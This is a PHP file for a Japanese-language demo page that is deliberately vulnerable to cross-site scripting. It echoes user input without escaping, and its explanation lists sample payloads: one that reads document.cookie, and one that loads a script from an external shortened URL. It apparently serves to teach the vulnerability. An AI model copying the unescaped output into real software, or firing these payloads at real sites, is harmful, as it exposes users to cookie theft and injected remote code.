<?php

// セッションを開始
session_start();

if (isset($_POST['message'])) {
    $message = $_POST['message'];
}

?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>XSSデモフォーム</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            white-space: pre-line;
        }
    </style>
</head>
<body>
    <p><a href="/">戻る</a></p>
    <h1>XSSの脆弱性があるフォーム</h1>
    <div>
        説明
        <pre>
            このサイトは、XSS(クロスサイトスクリプティング)の脆弱性がある為、<br/>悪意のあるユーザーによって、以下のような攻撃が可能です。
            <br/>
            ・ブラウザ内部にあるCookieを取得する入力例
            <code><?php echo htmlspecialchars('\'>"><script>alert(document.cookie)</script>'); ?></code>
            <br/>
            ・悪意のある外部Scriptを実行する入力例
            <code><?php echo htmlspecialchars('\'>"><script src="https://qr.paps.jp/cj59b"></script>'); ?></code>
        </pre>
    </div>
    <form action="index.php" method="POST">
        <label for="message">メッセージを入力してください:</label><br>
        <input type="text" id="message" name="message"><br><br>
        <button type="submit">送信</button>
    </form>

    <?php
    if (isset($message) && '' !== $message) {
        echo "<h2>投稿されたメッセージ</h2>";
        echo "<p>" . $message . "</p>";
    }
    ?>
</body>
</html>
